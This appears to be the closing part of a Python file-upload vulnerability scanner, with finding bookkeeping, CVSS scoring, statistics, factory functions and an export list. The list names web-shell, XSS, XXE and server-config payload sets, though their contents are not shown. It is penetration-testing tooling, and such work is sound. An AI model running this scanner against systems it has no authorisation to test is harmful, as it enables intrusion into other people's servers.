            cvss_score=self._calculate_cvss(severity),
            request_details=request_details,
            response_details=response_details,
        )

        self.findings.append(finding)
        logger.info(f"[FileUpload] Found: {vuln_type.name} ({severity}) - {technique}")

    def _calculate_cvss(self, severity: str) -> float:
        """Calculate CVSS score based on severity."""
        cvss_map = {
            "CRITICAL": 9.8,
            "HIGH": 8.6,
            "MEDIUM": 6.5,
            "LOW": 3.7,
            "INFO": 0.0,
        }
        return cvss_map.get(severity, 5.0)

    def get_findings(self) -> List[UploadFinding]:
        """Get all findings."""
        return self.findings

    def get_statistics(self) -> Dict[str, Any]:
        """Get scan statistics."""
        return {
            "total_attempts": len(self.attempts),
            "successful_uploads": len([a for a in self.attempts if a.response_code in [200, 201, 204]]),
            "confirmed_executions": len([a for a in self.attempts if a.execution_confirmed]),
            "total_findings": len(self.findings),
            "critical_findings": len([f for f in self.findings if f.severity == "CRITICAL"]),
            "high_findings": len([f for f in self.findings if f.severity == "HIGH"]),
            "medium_findings": len([f for f in self.findings if f.severity == "MEDIUM"]),
            "techniques_tested": len(set(a.technique for a in self.attempts)),
        }


# =============================================================================
# FACTORY FUNCTIONS
# =============================================================================

def create_file_upload_scanner(
    http_client: Any = None,
    config: Optional[ScanConfig] = None,
) -> FileUploadScanner:
    """Create a configured file upload scanner instance."""
    return FileUploadScanner(http_client=http_client, config=config)


async def scan_file_upload(
    target_url: str,
    http_client: Any = None,
    **kwargs,
) -> List[UploadFinding]:
    """Convenience function to scan for file upload vulnerabilities."""
    scanner = create_file_upload_scanner(http_client=http_client)
    return await scanner.scan(target_url, **kwargs)


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Version
    "VERSION",

    # Enums
    "UploadVulnType",
    "FileType",
    "ServerType",

    # Data classes
    "UploadEndpoint",
    "UploadAttempt",
    "UploadFinding",
    "ScanConfig",

    # Classes
    "FileUploadScanner",
    "PolyglotGenerator",
    "UploadEndpointDiscovery",

    # Constants
    "FILE_SIGNATURES",
    "PHP_EXTENSIONS",
    "JSP_EXTENSIONS",
    "ASP_EXTENSIONS",
    "DOUBLE_EXTENSIONS",
    "PHP_PAYLOADS",
    "JSP_PAYLOADS",
    "ASP_PAYLOADS",
    "ASPX_PAYLOADS",
    "SVG_XSS_PAYLOADS",
    "HTACCESS_PAYLOADS",
    "WEB_CONFIG_PAYLOADS",
    "XXE_PAYLOADS",

    # Factory functions
    "create_file_upload_scanner",
    "scan_file_upload",

    # Utilities
    "generate_case_variations",
]
